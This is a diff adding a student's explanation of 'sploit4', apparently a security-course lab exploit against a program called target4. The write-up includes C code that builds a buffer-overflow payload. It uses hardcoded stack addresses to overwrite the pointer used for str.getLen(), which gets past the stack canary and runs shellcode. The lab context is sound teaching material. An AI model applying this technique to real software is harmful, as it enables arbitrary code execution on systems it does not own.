@@ -1,1 +1,42 @@
-Use this file to explain how your sploit4 works.
+Target4 has bufer overflow vulnerability but it use canary so we cannot change
+"return address" of print_sub_string function. However, in this function
+str.getLen() fuction is called and we can overwrite address of this function 
+to execute our shellcode instead of str.getLen().
+
+First we define arg1 to put malcious input on it.
+
+	char arg1[100];
+
+The address of str.getLen() funtion will be saved at address *(0xbefffd4c)+12 
+so we write the &buf at 0xbefffd4c and then we put address of our shellcode 
+in &buf+12. In the following instruction you can see that we have put 
+address of shellcode in &buf+12.
+
+	strcpy(arg1, "aaaabbbbcccc\x08\xfd\xff\xbe");
+
+After that we place our shellcode (it will be located at &buf+16 which will be
+0xbefffd08 and it is what that we have write at address &buf+12).
+
+	strcpy(arg1+16, shellcode);
+
+Next, we write some arbitrary character on stack in order to the buf overflows
+and then we put &buf. Before overwriting, address of str.getLen()-12 was here but we 
+put address of shellcode-12 (which is &buf) here.
+
+	strcat(arg1, "aaaaaaaaaaaaaaaaaaaaaaaaaabbbbb\xf8\xfc\xff\xbe");
+
+We set start 0.
+
+	char arg2[] = "0";
+
+We set Length 63.
+
+	char arg3[] = "63";
+
+Finally, we execute target4 and pass arg1 as its input.
+
+	char *args[] = { TARGET, arg1, arg2, arg3, NULL };
+	char *env[] = { NULL };
+
+	if (0 > execve(TARGET, args, env))
+		fprintf(stderr, "execve failed.\n");
